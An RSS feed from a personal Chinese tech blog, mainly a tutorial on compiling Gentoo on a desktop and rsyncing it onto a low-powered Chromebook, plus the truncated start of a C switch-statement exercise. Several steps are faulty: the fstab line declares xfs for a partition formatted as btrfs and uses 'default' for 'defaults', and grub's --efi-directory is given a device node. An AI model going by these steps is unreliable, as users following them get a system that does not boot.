<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>教程 - 标签 - WeepingDogel</title>
        <link>http://weepingdogel.github.io/tags/%E6%95%99%E7%A8%8B/</link>
        <description>教程 - 标签 - WeepingDogel</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Sat, 11 Jun 2022 08:00:00 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/%E6%95%99%E7%A8%8B/" rel="self" type="application/rss+xml" /><item>
    <title>利用 rsync 给笔记本安装 Gentoo</title>
    <link>http://weepingdogel.github.io/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/</link>
    <pubDate>Sat, 11 Jun 2022 08:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/95/wallhaven-955vx1.jpg" referrerpolicy="no-referrer">
            </div><h1 id="序">序</h1>
<p>半年不见，甚是想念～</p>
<p>我有一台性能羸弱不堪的 ChromeBook，</p>
<p>2GB 的 RAM 和一颗 只有 2.6 GHz 的双核老低压 U 对于现在的流行发行版来说已经完全不够用了，目前跑个 Mint 也是 CPU 经常性的 100% 占用。</p>
<p></p>
<p>于是我想着能不能给他装个 Gentoo？</p>
<p>然而就这乌龟U，估计得连续开机一周才能编译完吧&hellip;</p>
<p>嗯，不过我想试试能不能通过台式机编译完 Gentoo 再通过 rsync 给它传输到 ChromeBook。</p>
<p></p>
<p>论编译，我感觉哪怕是在 2022 年 E3 神教也不会让我失望吧。</p>
<p>起码比这颗小赛扬快多了。</p>
<h1 id="准备工作">准备工作</h1>
<p>废话不多说，直接开搞。</p>
<p>但我们要准备好这些东西</p>
<ul>
<li><a href="https://wiki.gentoo.org/wiki/Main_Page" target="_blank" rel="noopener noreffer">Gentoo Wiki</a>
<ul>
<li>安装过程中需要用到官方的指引和文档，必备</li>
</ul>
</li>
<li>翻译工具
<ul>
<li>由于 Gentoo 的用户群体较小，文档汉化可能不是很全面，因此可以借助翻译工具，这里推荐 <a href="https://www.deepl.com/zh/translator" target="_blank" rel="noopener noreffer">deepl</a></li>
</ul>
</li>
<li>一个 U 盘
<ul>
<li>用来装一个临时的 Linux 作为笔记本的 rsync 接收端。</li>
<li>这个没什么好说的，最好支持 USB 3.0～</li>
</ul>
</li>
<li>下载好 Gentoo 官方提供的 stage 包
<ul>
<li>这个会在下文中写出过程</li>
</ul>
</li>
<li>一个能够操作的 Linux 终端</li>
</ul>
<h1 id="下载-stage-压缩包">下载 stage 压缩包</h1>
<p>由于我们的安装手段比较特殊，因此可以直接跳到官方 wiki 的这一步</p>
<p>按照官方 wiki 给出的文档，我们进行以下操作:</p>
<p>首先开启 root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weepingdogel $ sudo -i
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来，你可以挂载一个分区到 <code>mnt</code> ，也可以直接创建文件夹，我这边空间很充足就直接空载操作了。</p>
<p>至于如何挂载？可以去参考 Arch Wiki。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # cd /mnt/gentoo
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们需要用 wget 下载 stage 包，打开<a href="https://www.gentoo.org/downloads/#other-arches" target="_blank" rel="noopener noreffer">这个页面</a>，这里我们选择 stage3</p>
<p>因为我懒，喜欢用 systemd ， 可以根据需要选择。</p>
<p><strong>注意：右键 stage3 systemd ，复制链接</strong></p>
<p></p>
<p>将链接粘贴到终端上</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # wget https://bouncer.gentoo.org/fetch/root/all/releases/amd64/autobuilds/20220605T170549Z/stage3-amd64-systemd-20220605T170549Z.tar.xz
</span></span></code></pre></td></tr></table>
</div>
</div><p>等待下载。</p>
<p></p>
<p>下载完成之后可以进行一下文件校验，可以参考一下官方的<a href="https://wiki.gentoo.org/wiki/Handbook:AMD64/Installation/Stage/zh-cn" target="_blank" rel="noopener noreffer">这个条目</a></p>
<p></p>
<p>一般情况下我这边不会损坏，所以我这里就不写出来了，接下来我们直接进入解压 stage 文件这一步。</p>
<h1 id="解压-stage-压缩包">解压 stage 压缩包</h1>
<p>我们使用 tar 来进行解压，这是官方 wiki 给出的命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root #tar xpvf stage3-*.tar.bz2 --xattrs-include=&#39;*.*&#39; --numeric-owner
</span></span></code></pre></td></tr></table>
</div>
</div><p>有些读者可能看不懂中间那一串，那一串其实是个通配符，不过这个通配符可能跟你下载到的文件不一样，因此我们将中间那段改成准确的文件名。</p>
<p>这一步操作很简单，只需要按一下 Tab 键即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # tar xpvf stage3-amd64-systemd-20220102T170545Z.tar.xz --xattrs-include=&#39;*.*&#39; --numeric-owner
</span></span></code></pre></td></tr></table>
</div>
</div><p>等待解压，一会儿就好，<del>除非你用 IDE 硬盘</del>。</p>
<p></p>
<h1 id="配置编译选项">配置编译选项</h1>
<p>这一步官方是这么解释的：</p>
<blockquote>
<p>为了优化Gentoo，可以设置一些影响Portage的变量，Gentoo官方支持包管理器。 所有这些变量可以设置为环境变量（使用export），但这不是永久的。 为了保留设置，Portage读入/etc/portage/make.conf文件 ，一个用于Portage的配置文件。</p>
<blockquote>
<p>附注</p>
<p>所有可能的变量的注释列表可以在 /mnt/gentoo/usr/share/portage/config/make.conf.example中找到。要成功安装Gentoo，只需要设置下面提到的变量。</p>
</blockquote>
<p>启动编辑器（在本指南中，我们使用 nano）来更改我们将在下面讨论的优化变量。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">root #nano -w /mnt/gentoo/etc/portage/make.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>从make.conf.example文件中可以明显看出文件的结构：注释行以 &ldquo;#&ldquo;开头，其他行使用 VARIABLE=&ldquo;content 语法定义变量。 接下来选取其中的几个进行讨论。</p>
</blockquote>
<p>这里我们用 vim 写一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # vim /mnt/gentoo/etc/portage/make.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>将里面的 <code>COMMON_FLAGS=</code> 加入 <code>-march=silvermont</code> 的选项，这样就能让编译器给 <code>silvermont</code> 架构的垃圾 CPU 进行优化了。</p>
<p>完整文件如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># These settings were set by the catalyst build script that automatically
</span></span><span class="line"><span class="cl"># built this stage.
</span></span><span class="line"><span class="cl"># Please consult /usr/share/portage/config/make.conf.example for a more
</span></span><span class="line"><span class="cl"># detailed example.
</span></span><span class="line"><span class="cl">COMMON_FLAGS=&#34;-march=silvermont -O2 -pipe&#34;
</span></span><span class="line"><span class="cl">CFLAGS=&#34;${COMMON_FLAGS}&#34;
</span></span><span class="line"><span class="cl">CXXFLAGS=&#34;${COMMON_FLAGS}&#34;
</span></span><span class="line"><span class="cl">FCFLAGS=&#34;${COMMON_FLAGS}&#34;
</span></span><span class="line"><span class="cl">FFLAGS=&#34;${COMMON_FLAGS}&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># NOTE: This stage was built with the bindist Use flag enabled
</span></span><span class="line"><span class="cl">PORTDIR=&#34;/var/db/repos/gentoo&#34;
</span></span><span class="line"><span class="cl">DISTDIR=&#34;/var/cache/distfiles&#34;
</span></span><span class="line"><span class="cl">PKGDIR=&#34;/var/cache/binpkgs&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># This sets the language of build output to English.
</span></span><span class="line"><span class="cl"># Please keep this setting intact when reporting bugs.
</span></span><span class="line"><span class="cl">LC_MESSAGES=C
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="安装-gentoo-基础系统">安装 Gentoo 基础系统</h1>
<p>上面已经完成了第一阶段的操作，可以开始安装基本系统了，诶嘿嘿。</p>
<p>接下来要做的是选择镜像源，我们可以参考 ustc mirror 给出的帮助文档：</p>
<ul>
<li><a href="https://mirrors.ustc.edu.cn/help/gentoo.html" target="_blank" rel="noopener noreffer">Gentoo 源使用帮助 — USTC Mirror Help  文档</a></li>
<li><a href="https://mirrors.ustc.edu.cn/help/gentoo-portage.html" target="_blank" rel="noopener noreffer">Gentoo Portage 源使用帮助 — USTC Mirror Help  文档</a></li>
</ul>
<p>直接按照 ustc 给出的帮助设置这两个源地址就好啦～</p>
<p></p>
<p></p>
<p>然后复制 DNS 信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # cp --dereference /etc/resolv.conf /mnt/gentoo/etc/
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="挂载必要的文件系统">挂载必要的文件系统</h2>
<p>这里要注意一下了，我这边要打好几条命令</p>
<p>Why？</p>
<p>官方的解释：</p>
<blockquote>
<p>稍等片刻，Linux 的根目录将变更到新的位置。为了确保新环境正常工作，需要确保一些文件系统可以正常使用。</p>
<p>需要提供的文件系统是：</p>
<ul>
<li>/proc/ 一个pseudo文件系统（看起来像是常规文件，事实上却是实时生成的），由Linux内核暴露的一些环境信息</li>
<li>/sys/ 一个pseudo文件系统，像要被取代的/proc/一样，比/proc/更加有结构</li>
<li>/dev/ 是一个包含全部设备文件的常规文件系统，一部分由Linux设备管理器（通常是udev）管理</li>
</ul>
<p>/proc/位置将要挂载到/mnt/gentoo/proc/，而其它的两个都是绑定挂载。字面上的意思是，例如/mnt/gentoo/sys/事实上就是/sys/（它只是同一个文件系统的第二个条目点），而/mnt/gentoo/proc/是（可以说是）文件系统的一个新的挂载。</p>
</blockquote>
<p>因此按顺序执行以下命令进行挂载：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # mount --types proc /proc /mnt/gentoo/proc
</span></span><span class="line"><span class="cl">root # mount --rbind /sys /mnt/gentoo/sys
</span></span><span class="line"><span class="cl">root # mount --make-rslave /mnt/gentoo/sys
</span></span><span class="line"><span class="cl">root # mount --rbind /dev /mnt/gentoo/dev
</span></span><span class="line"><span class="cl">root # mount --make-rslave /mnt/gentoo/dev 
</span></span></code></pre></td></tr></table>
</div>
</div><p>然而，这还没完</p>
<p></p>
<p>因此，接下来要加上这三条</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # test -L /dev/shm &amp;&amp; rm /dev/shm &amp;&amp; mkdir /dev/shm
</span></span><span class="line"><span class="cl">root # mount --types tmpfs --options nosuid,nodev,noexec shm /dev/shm 
</span></span><span class="line"><span class="cl">root # chmod 1777 /dev/shm
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="chroot--进入新环境">Chroot : 进入新环境</h2>
<p>当挂载好一切后，就可以 chroot 进去了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # chroot /mnt/gentoo /bin/bash 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # source /etc/profile 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root # export PS1=&#34;(chroot) ${PS1}&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来终端会变成这样</p>
<p></p>
<h2 id="挂载-boot-分区">挂载 boot 分区</h2>
<p>这一步我们直接略过，因为最终安装的设备不是本机，而是另一台笔记本。</p>
<p>之后我们再进行手动安装引导介质。</p>
<h2 id="从网站安装-gentoo-ebuild-数据库快照">从网站安装 Gentoo ebuild 数据库快照</h2>
<p>官方其实这个就相当于 Arch 里面的 <code>sudo pacman -Syyu</code></p>
<p>不多说，复制粘贴吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">root # emerge-webrsync
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<h2 id="选择配置文件">选择配置文件</h2>
<p><del>我怎么感觉像是在复制 wiki 的内容呢&hellip;</del></p>
<blockquote>
<p>配置文件是任何一个Gentoo系统的积木。它不仅指定USE、CFLAGS和其它重要变量的默认值，还会锁定系统的包版本范围。这些设定全是由Gentoo的Portage开发者们来维护。</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># eselect profile list
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Available profile symlink targets:
</span></span><span class="line"><span class="cl">  [1]   default/linux/amd64/17.1 *
</span></span><span class="line"><span class="cl">  [2]   default/linux/amd64/17.1/desktop
</span></span><span class="line"><span class="cl">  [3]   default/linux/amd64/17.1/desktop/gnome
</span></span><span class="line"><span class="cl">  [4]   default/linux/amd64/17.1/desktop/kde
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后输入以下命令即可：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># eselect profile set [对应的数字]
</span></span></code></pre></td></tr></table>
</div>
</div><p>其实它会列出很多选项，我们需要选择含有 <code>desktop/system</code> 的版本</p>
<h2 id="设置时区">设置时区</h2>
<p>这里直接用 Arch 的方法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># ln -sf /usr/share/zoneinfo/Region（地区名）/City（城市名） /etc/localtime
</span></span></code></pre></td></tr></table>
</div>
</div><p>根据我的情况，我应该这样写：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后运行 hwclock 以生成 /etc/adjtime：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># hwclock --systohc
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="设置-use">设置 USE</h2>
<p>对于 Gentoo 这个系统来说， USE 标记是必备的，因此在编译之前，我们需要设置好全局 USE 标记</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># vim /etc/portage/make.conf
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">USE=&#34;alsa udev dbus icu systemd gles2 sound video intel -kde tiff x265&#34;
</span></span><span class="line"><span class="cl">VIDEO_CARDS=&#34;intel&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="更新-world-集合">更新 @world 集合</h2>
<p>其实就是跟 Arch 的“滚”差不多，但是它会是一个比较漫长的过程。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># emerge --ask --verbose --update --deep --newuse @world
</span></span></code></pre></td></tr></table>
</div>
</div><p>除此之外，在更改USE标记之后，这条命令也用来动态调整系统功能。</p>
<h2 id="配置-locale">配置 locale</h2>
<p>麻了，参考这个 <a href="https://wiki.archlinux.org/title/Installation_guide_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E6%9C%AC%E5%9C%B0%E5%8C%96" target="_blank" rel="noopener noreffer">Installation guide (简体中文) - ArchWiki</a></p>
<h1 id="配置内核">配置内核</h1>
<p>嗯哼，你以为我那么傻又编译八个小时？不！这次我选择用 bin 内核！</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># emerge --ask sys-kernel/installkernel-systemd-boot
</span></span></code></pre></td></tr></table>
</div>
</div><p>节省不少时间呢。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># emerge --ask sys-kernel/gentoo-kernel-bin
</span></span></code></pre></td></tr></table>
</div>
</div><p>哎呀不想写了&hellip; 写了都是复制粘贴</p>
<p>自己看吧</p>
<p></p>
<h1 id="安装固件">安装固件</h1>
<blockquote>
<p>一些驱动需要先在系统上安装附加的固件才能工作。经常网络接口上会使用，特别是无线网络接口。此外，来自 AMD 、 NVidia 和 Intel 等供应商的现代视频芯片在使用开源驱动程序时，通常也需要外部固件文件。大多数固件都打包在 sys-kernel/linux-firmware 里</p>
</blockquote>
<p>大多数设备的驱动都依赖于 <code>linux-firmware</code> 这个包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># emerge --ask sys-kernel/linux-firmware
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="配置-fstab">配置 fstab</h1>
<p>这一步操作是在系统启动的时候，让内核认识分区</p>
<p>但是 Gentoo 好像不能用 <code>genfstab</code></p>
<p>只能手写了</p>
<p>先在笔记本获取 UUID</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls /dev/disk/by-uuid/ -l
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来将 <code>/</code> 分区对应分区的 <code>UUID</code> 按如下格式写在 <code>/etc/fstab</code> 这个文件里面</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># /dev/mmcblk1p2
</span></span><span class="line"><span class="cl">UUID=xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx	/         	xfs       	default,rw,relatime	0 1
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="通过-rsync-将系统灌到笔记本上">通过 rsync 将系统灌到笔记本上</h1>
<p>这个时候需要给笔记本插入一个 ArchISO 的 U 盘，启动到 ISO，<strong>并连接 WIFI 和 开启 ssh 服务。</strong></p>
<p>接下来将其原有的分区格式化</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># mkfs.btrfs /dev/mmcblk1p2 -f
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后挂载它，并将刚刚做好的文件用 rsync 灌进去</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># mount /dev/mmcblk1p2 /mnt 
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来笔记本这一端开启 ssh 服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># systemctl start sshd
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后使用 rsync 将编译好的文件传输至笔记本的系统分区。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># rsync -aAXHv -P -vi --exclude={&#34;/dev/*&#34;,&#34;/proc/*&#34;,&#34;/sys/*&#34;,&#34;/tmp/*&#34;,&#34;/run/*&#34;,&#34;/mnt/*&#34;,&#34;/media/*&#34;,&#34;/lost+found&#34;} ./mnt/gentoo/. root@192.168.0.109:/mnt
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="在笔记本安装启动引导器">在笔记本安装启动引导器</h1>
<p>这个也是很熟悉的操作了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># grub-install --target=x86_64-efi --efi-directory=/dev/mmcblk1p1 --bootloader-id=GRUB
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="结语">结语</h1>
<p>通过一系列的折腾，这台老本子终于能发挥其最大的性能了。</p>
<p>由此看来通过 rsync 复制 Linux 发行版系统文件到其他的设备看起来是可行的。</p>
<p>不过也折腾了挺久的</p>
<h1 id="参考链接">参考链接</h1>
<ul>
<li><a href="https://wiki.gentoo.org/wiki/Main_Page" target="_blank" rel="noopener noreffer">Gentoo Wiki</a></li>
<li><a href="https://www.gentoo.org/downloads/#other-arches" target="_blank" rel="noopener noreffer">Downloads â Gentoo Linux</a></li>
<li><a href="https://wiki.gentoo.org/wiki/Handbook:AMD64/Installation/Stage/zh-cn" target="_blank" rel="noopener noreffer">安装Gentoo安装文件 - Gentoo Wiki</a></li>
<li><a href="https://mirrors.ustc.edu.cn/help/gentoo.html" target="_blank" rel="noopener noreffer">Gentoo 源使用帮助 — USTC Mirror Help  文档</a></li>
<li><a href="https://mirrors.ustc.edu.cn/help/gentoo-portage.html" target="_blank" rel="noopener noreffer">Gentoo Portage 源使用帮助 — USTC Mirror Help  文档</a></li>
<li><a href="https://wiki.archlinux.org/title/Installation_guide_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E6%9C%AC%E5%9C%B0%E5%8C%96" target="_blank" rel="noopener noreffer">Installation guide (简体中文) - ArchWiki</a></li>
</ul>
]]></description>
</item><item>
    <title>输入一个分数判断该分数的评级</title>
    <link>http://weepingdogel.github.io/posts/%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E5%88%86%E6%95%B0%E5%88%A4%E6%96%AD%E8%AF%A5%E5%88%86%E6%95%B0%E7%9A%84%E8%AF%84%E7%BA%A7/</link>
    <pubDate>Tue, 15 Jun 2021 09:01:29 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E5%88%86%E6%95%B0%E5%88%A4%E6%96%AD%E8%AF%A5%E5%88%86%E6%95%B0%E7%9A%84%E8%AF%84%E7%BA%A7/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/%e6%88%aa%e5%9b%be_2021-06-15_10-16-02.png" referrerpolicy="no-referrer">
            </div><h1 id="序">序</h1>
<p>好久没玩过 C 了， 昨晚看到一个题:</p>
<blockquote>
<p>输入一个分数，自动判断该分数的评级</p>
<p>要求: 使用 switch(){}</p>
</blockquote>
<h1 id="过程">过程</h1>
<p>首先我肯定要获取这个分数然后赋值给某个变量，用 <code>scanf();</code> 就可以做到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
